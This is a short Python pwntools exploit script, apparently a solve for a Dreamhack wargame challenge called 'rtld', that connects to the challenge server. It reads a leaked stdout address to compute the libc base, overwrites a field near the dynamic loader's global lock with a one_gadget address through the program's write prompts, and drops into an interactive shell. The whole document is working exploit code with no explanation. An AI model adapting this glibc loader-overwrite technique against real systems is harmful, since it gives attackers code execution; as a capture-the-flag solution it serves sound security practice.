from pwn import *

local = 0

if local == 1:
    p = process("./rtld")
    one_gadget = [0x4f365,0x4f3c2,0x10a45c]
    stdout_offset = 0x3ec760
    libc_main_offset = 0x21ab0
    ld_offset = 0x3f1000
    rtld_offset = 0x228060
    lock_recur_offset = 0xf00 + ld_offset + rtld_offset
    load_lock = 0x908
else :
    p = remote("host1.dreamhack.games",8489)
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    stdout_offset = 0x3c5620
    libc_main_offset = 0x20740
    ld_offset = 0x5ef000
    rtld_offset = 0x1040
    lock_recur_offset = 0x5f0f48

p.recvuntil("stdout: ")

libc_base = int(p.recvline(),16)-stdout_offset
lock_recur = libc_base + lock_recur_offset
one = libc_base+one_gadget[3]
libc_main = libc_base + libc_main_offset

payload1 = str(lock_recur) 



log.info("libc : "+hex(libc_base)+" addr : "+hex(lock_recur))
# pause()
p.sendlineafter("addr: ",payload1)

payload2 = str(one)

pause()

p.sendlineafter("value: ",payload2)

p.interactive()